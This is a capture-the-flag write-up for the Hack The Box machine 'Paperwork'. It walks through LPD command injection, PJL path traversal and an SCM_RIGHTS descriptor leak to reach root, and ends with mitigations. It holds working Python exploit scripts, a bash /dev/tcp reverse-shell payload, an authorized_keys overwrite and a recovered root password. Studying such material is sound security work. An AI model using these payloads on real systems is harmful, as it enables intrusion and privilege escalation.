# HTB: Paperwork

## Machine Information

| Item | Value |
|------|-------|
| Target | paperwork.htb |
| IP | 10.129.32.24 |
| OS | Linux |
| Initial Access | LPD Command Injection |
| Privilege Escalation | PJL Path Traversal → SCM_RIGHTS FD Leak |

---

## Attack Chain

```
Internet
    ↓
LPD Command Injection (port 1515)
    ↓
lp (local user)
    ↓
PJL Path Traversal (port 9100)
    ↓
archivist (local user)
    ↓
SCM_RIGHTS File Descriptor Leak (/run/paperwork/mgmt.sock)
    ↓
root
```

---

## Recon

### Port Scan

```
nmap -sCV -T4 10.129.32.24 -p22,80,1515
```

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH | SSH access |
| 80/tcp | nginx | "Intranet \| Document Archiving Service" at paperwork.htb |
| 1515/tcp | custom LPD | "Archive_Printer is ready and printing." |

### Source Code Download

The website provides a source code download at `paperwork-archive-v1.02.zip`. Key file: `server.py` — the LPD service running on port 1515.

---

## Initial Access

### Vulnerability

The LPD service on port 1515 has two critical flaws in its implementation of RFC 1179:

1. **Queue-name validation is a substring check**: The code checks `if queue not in VALID_QUEUE`, where `VALID_QUEUE` is a plain string. An empty queue name (`""`) is a substring of any string, bypassing validation entirely.

2. **Command injection in job name**: The `job_name` from the control file's `J` line is interpolated directly into a shell command without sanitization.

### Root Cause

```python
VALID_QUEUE = "archive"  # Plain string, not a list/set

if queue not in VALID_QUEUE:  # Substring check, not membership
    # Empty queue passes because "" in "archive" is True

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

### Exploitation

The LPD protocol (RFC 1179) requires a specific sequence over raw TCP:

1. Send control byte `\x02` + empty queue name + `\n`
2. Send subcommand `\x02` + control file size + filename
3. Send control file content containing the malicious `J` line
4. Terminate with `\x00`

```python
#!/usr/bin/env python3
import socket

LHOST = "10.10.14.X"
LPORT = 4444

# Control file with malicious job name
control_file = f"""Jx'; bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"; echo '
"""

# Step 1: Send job start with empty queue
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.129.32.24", 1515))
s.send(b"\x02\n")

# Step 2: Receive job ID
s.recv(1024)

# Step 3: Send control file subcommand
ctrl_size = len(control_file)
s.send(f"\x02 {ctrl_size} cfA000paperwork.htb\n".encode())

# Step 4: Send control file content
s.send(control_file.encode())

# Step 5: Terminate with null byte
s.send(b"\x00")
s.close()
```

### Result

**Reverse shell as `lp`:**

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.32.24 33276
id
uid=1001(lp) gid=1001(lp) groups=1001(lp)
```

---

## Privilege Escalation 1: `lp` → `archivist`

### Enumeration

As `lp`, check running processes:

```bash
ps aux | grep archivist
```

```
archivist  1234  0.0  0.1  12345  6789 ?  Ssl  Mar01  0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100
```

A custom printer service (`jetdirect.py`) running as user `archivist` on local port 9100.

Probe the service:

```bash
nc 127.0.0.1 9100
```

```
@PJL INFO STATUS
CODE: 10000
DISPLAY: Ready
@PJL INFO VARIABLES
...
```

### Vulnerability

`jetdirect.py` implements a subset of PJL (Printer Job Language) filesystem commands with no path sanitization:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))  # No traversal check!
```

The service runs with `self._root = "/home/archivist/printer/"`, but `../` sequences are not filtered, allowing arbitrary file read/write outside the spool root.

### Exploitation

PJL commands are wrapped with UEL (Universal Exit Language): `\x1b%-12345X`

#### Step 1: List the target directory

```
@PJL FSDIRLIST NAME="../" ENTRY=1 COUNT=999
```

#### Step 2: Check if `.ssh/authorized_keys` exists

```
@PJL FSUPLOAD NAME="../.ssh/authorized_keys" OFFSET=0 SIZE=1
```

If the file is missing, the service may error — this confirms we can write.

#### Step 3: Write SSH public key

Generate an SSH key pair on the attacker machine:

```bash
ssh-keygen -t rsa -b 4096 -f archivist_key
```

Create a script to send the PJL download command with the key data:

```python
#!/usr/bin/env python3
import socket

pubkey = "ssh-rsa AAAAB3... attacker@host"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))

# UEL start
payload = b"\x1b%-12345X@PJL\r\n"
payload += f"@PJL FSDOWNLOAD NAME=\"../.ssh/authorized_keys\" SIZE={len(pubkey)}\r\n".encode()
payload += b"\x1b%-12345X\r\n"
payload += pubkey.encode()
payload += b"\x1b%-12345X\r\n"

s.send(payload)
s.close()
```

### Result

**SSH access as `archivist`:**

```bash
ssh -i archivist_key archivist@10.129.32.24
archivist@paperwork:~$ id
uid=1002(archivist) gid=1002(archivist) groups=1002(archivist)
```

---

## Privilege Escalation 2: `archivist` → `root`

### Enumeration

As `archivist`, check for interesting files and processes:

```bash
find / -type s -perm -2000 -user root 2>/dev/null | grep -v snap
```

```
/run/paperwork/mgmt.sock
```

```bash
ls -la /run/paperwork/mgmt.sock
srw-rw---- 1 root archivist 0 Mar01 00:00 /run/paperwork/mgmt.sock
```

The socket is root-owned but group-writable by `archivist`.

```bash
cat /etc/systemd/system/paperwork.service
```

```
[Service]
ExecStart=/usr/bin/paperwork-daemon
User=root
Group=root
```

```bash
file /usr/bin/paperwork-daemon
/usr/bin/paperwork-daemon: ELF 64-bit LSB executable, stripped
strings /usr/bin/paperwork-daemon | grep -i admin
```

```
/etc/paperwork/admin_pins.conf
```

The daemon reads `admin_pins.conf` at startup — this file is not directly readable by `archivist`:

```bash
cat /etc/paperwork/admin_pins.conf
cat: admin_pins.conf: Permission denied
```

### Vulnerability

The `paperwork-daemon` implements a "malicious activity detection" and "lockdown" feature:

```python
LOG_PATH = "/home/archivist/printer/commands.log"

def scan_for_malice():
    with open(LOG_PATH) as f:
        content = f.read().upper()
        if any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    # admin_fd was opened at daemon startup as root:
    # admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

**The flaw**: The daemon opens `admin_pins.conf` at startup when running as root, then passes the file descriptor to any client that triggers the "lockdown" branch via `SCM_RIGHTS` ancillary data. Unix permission checks happen at `open()` time, not at `read()` time — once a file descriptor is duplicated into another process, that process can read it regardless of its own filesystem permissions.

The conditions to trigger the lockdown are already met: the `commands.log` file contains `FSQUERY`, `FSUPLOAD`, and `FSDOWNLOAD` from the PJL exploitation steps.

### Exploitation

The key challenge is properly receiving `SCM_RIGHTS` ancillary data — a plain `recv()` silently discards it. Must use `recvmsg()` with a properly-sized control buffer:

```python
#!/usr/bin/env python3
import socket
import array
import os
import struct

# Connect to the management socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

# Prepare to receive SCM_RIGHTS ancillary data
fds = array.array("i")
cmsg_space = socket.CMSG_LEN(4 * fds.itemsize)

# Receive message with ancillary data
msg, ancdata, flags, addr = s.recvmsg(4096, cmsg_space)

# Extract file descriptors
for level, typ, data in ancdata:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])

# Read from each received file descriptor
for fd in fds:
    content = os.pread(fd, 4096, 0)
    if content:
        print(content.decode(errors="ignore"))
```

### Result

```
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Get root shell:

```bash
archivist@paperwork:~$ su - root
Password: ApparelMortuaryCedar22
root@paperwork:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Cause Summary

| Step | Entry Point | Root Cause |
|------|-------------|------------|
| Initial Access | Port 1515 (LPD) | Substring check used for equality (`queue not in VALID_QUEUE` where `VALID_QUEUE` is a string); unsanitized f-string interpolated into `shell=True` |
| PE 1 (archivist) | Port 9100 (PJL) | No path traversal sanitization in `Filesystem._translate()` — `../` sequences escape the spool root |
| PE 2 (root) | `/run/paperwork/mgmt.sock` | Root process passes a privileged file descriptor to an unprivileged client via `SCM_RIGHTS`, gated only by a log content condition the user fully controls |

---

## Mitigations

| Vulnerability | Recommended Fix |
|---------------|-----------------|
| LPD queue validation | Use `if queue not in VALID_QUEUES` where `VALID_QUEUES` is a `set()` or `list` — not a string |
| LPD shell injection | Avoid `shell=True`; use `subprocess.Popen(["echo", f"Archive: {job_name}"], ...)` or `shlex.quote()` |
| PJL path traversal | After `normpath`, use `os.path.commonpath([resolved, self._root]) == self._root` to enforce containment |
| SCM_RIGHTS FD leak | Never send privileged file descriptors over sockets; if sending file descriptors is required, `dup2()` the FD with `O_RDONLY | O_CLOEXEC` and verify the receiving process's credentials before sending |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `netcat` | Manual interaction with LPD and PJL services |
| `ssh` | Secure shell access to `archivist` user |
| `python3` | Custom exploit scripts for LPD injection, PJL file upload, and SCM_RIGHTS FD theft |
| `strings` | Extract hardcoded paths from binary daemon |

---

## Key Takeaways

1. **String "membership" checks**: Using `in` on a string tests for substring presence, not set membership. Always use `set()` or `list` for validation.

2. **Shell command construction**: Never interpolate user input into shell commands, especially with `shell=True`. Use argument lists or `shlex.quote()`.

3. **Path traversal defense**: `normpath()` + `join()` is insufficient — verify the resolved path stays within the intended root with `commonpath()` or `realpath()` checks.

4. **File descriptor permissions**: Unix file permissions are checked at `open()` time, not at `read()` time. Once a FD is open, it can be passed to processes that wouldn't normally have access via `SCM_RIGHTS`. This is a feature, not a bug — but it requires careful security design.

5. **SCM_RIGHTS dangers**: Sending file descriptors over Unix sockets is powerful but dangerous. The receiving process inherits the **permissions of the FD**, not its own filesystem permissions. Only send FDs to trusted peers, and consider using `O_CLOEXEC` and `fcntl()` to restrict the FD's capabilities.

6. **Defense-in-depth**: The "security alert" mechanism should not be the vector for privilege escalation. Validate the trust level of the peer before transmitting sensitive data, and never use the **same log file** that the user can write to as the trigger condition.
